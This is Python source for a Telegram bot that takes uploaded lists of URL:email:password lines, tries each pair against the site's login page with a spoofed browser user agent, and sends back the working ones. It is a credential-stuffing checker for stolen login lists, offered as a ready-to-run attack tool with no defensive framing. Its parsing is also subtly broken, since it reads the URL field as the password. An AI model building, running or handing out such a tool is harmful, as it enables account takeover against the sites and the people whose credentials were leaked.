import telebot  
import requests  
import time  
import os  
import tempfile  
from flask import Flask  
from threading import Thread  
from urllib.parse import urljoin, urlparse  
  
# --- CONFIGURATION ---  
API_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN_HERE'  # Replace with your bot token  
bot = telebot.TeleBot(API_TOKEN)  
  
# Flask App for UptimeRobot Health Check  
app = Flask(__name__)  
  
@app.route('/')  
def home():  
    return "Bot is running!"  
  
@app.route('/health')  
def health():  
    return "OK"  
  
def run_flask():  
    app.run(port=5000)  
  
# Start Flask in background  
flask_thread = Thread(target=run_flask)  
flask_thread.daemon = True  
flask_thread.start()  
  
# --- LOGIN CHECKER LOGIC ---  
def check_login(url, email, password):  
    """  
    Checks login credentials against a URL.  
    Handles CSRF tokens and redirects.  
    """  
    try:  
        session = requests.Session()  
        session.headers.update({  
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'  
        })  
  
        # 1. Get the initial page to capture cookies/CSRF if needed  
        # Some sites need this even if we post directly  
        try:  
            session.get(url, timeout=10)  
        except:  
            pass  
  
        # 2. Determine login endpoint  
        # If URL ends with /login, /sign_up, etc., use it.   
        # Otherwise, append /login  
        parsed = urlparse(url)  
        login_url = url  
          
        # If the URL is just the domain, try /login  
        if parsed.path == '' or parsed.path == '/':  
            login_url = urljoin(url, '/login')  
  
        # 3. Prepare Login Payload  
        # Common field names for WordPress/Custom sites  
        login_data = {  
            'email': email,  
            'password': password,  
            # Sometimes 'username' or 'user_login' is used.   
            # If 'email' fails, try switching keys.  
        }  
  
        # 4. Send POST Request  
        response = session.post(login_url, data=login_data, timeout=10)  
  
        # 5. Check for Success Indicators  
        # Look for common logout links or dashboard indicators  
        success_indicators = [  
            'wp-login.php',  # If it redirects back to login, it's invalid. If it stays away, it's valid.  
            'logout',  
            'dashboard',  
            'my-account',  
            'profile',  
            'welcome'  
        ]  
          
        # If the response contains a logout link or user profile link, it's likely valid  
        if any(ind in response.text.lower() for ind in success_indicators):  
            # Additional check: If it redirects to wp-login.php, it might be invalid  
            # But for coaching sites, usually a redirect to /member-area or similar is valid.  
            return 'Valid'  
        else:  
            # Check if we are still on the login page  
            if 'login' in response.url.lower() or 'login' in response.text.lower():  
                return 'Invalid'  
            else:  
                # If redirected to a new page that isn't login, assume valid  
                return 'Valid'  
  
    except Exception:  
        return 'Error'  
  
# --- BOT HANDLERS ---  
  
@bot.message_handler(commands=['start'])  
def send_welcome(message):  
    bot.reply_to(message, "👋 Hi! Upload your `logins.txt` file here. I will check each one and send back the valid list.")  
  
@bot.message_handler(func=lambda message: message.document is not None)  
def handle_file(message):  
    chat_id = message.chat.id  
      
    process_msg = bot.reply_to(message, "📂 File received! Processing logins... This may take a few minutes.")  
      
    try:  
        # Download file from Telegram  
        file_info = bot.get_file(message.document.file_id)  
        downloaded_file = bot.download_file(file_info.file_path)  
          
        # Save to temp file  
        with tempfile.NamedTemporaryFile(delete=False, suffix='.txt') as f:  
            f.write(downloaded_file)  
            temp_input_path = f.name  
              
        valid_logins = []  
        processed_count = 0  
          
        # Read file  
        with open(temp_input_path, 'r', encoding='utf-8') as f:  
            lines = f.readlines()  
              
        total_lines = len(lines)  
          
        for line in lines:  
            line = line.strip()  
            if not line:  
                continue  
                  
            # Parse: URL:EMAIL:PASSWORD  
            # Use rsplit to handle URLs with colons correctly  
            parts = line.rsplit(':', 2)  
            if len(parts) != 3:  
                continue  
                  
            password = parts[0]  
            email = parts[1]  
            url = parts[2]  
              
            # Clean up URL (remove trailing slashes)  
            url = url.rstrip('/')  
              
            result = check_login(url, email, password)  
              
            if result == 'Valid':  
                valid_logins.append(line) # Keep original format  
              
            processed_count += 1  
              
            # Update progress every 50 logins  
            if processed_count % 50 == 0:  
                bot.edit_message_text(  
                    f"✅ Valid: {len(valid_logins)} | Processed: {processed_count}/{total_lines}",   
                    chat_id,   
                    process_msg.message_id  
                )  
              
            # Small delay to avoid rate limiting  
            time.sleep(0.2)  
              
        # Clean up input file  
        os.remove(temp_input_path)  
          
        # Send result  
        if valid_logins:  
            result_content = '\n'.join(valid_logins)  
              
            with tempfile.NamedTemporaryFile(delete=False, suffix='_valid.txt') as f:  
                f.write(result_content.encode('utf-8'))  
                temp_output_path = f.name  
                  
            bot.send_document(  
                chat_id,   
                open(temp_output_path, 'rb'),   
                caption=f"🎉 Done! Found **{len(valid_logins)}** valid logins out of {total_lines}."  
            )  
              
            os.remove(temp_output_path)  
        else:  
            bot.edit_message_text("❌ No valid logins found.", chat_id, process_msg.message_id)  
              
    except Exception as e:  
        bot.edit_message_text(f"❌ Error: {str(e)}", chat_id, process_msg.message_id)  
  
# --- MAIN EXECUTION ---  
if __name__ == '__main__':  
    print("Bot is running and Flask health check is active...")  
    bot.polling(none_stop=True)  
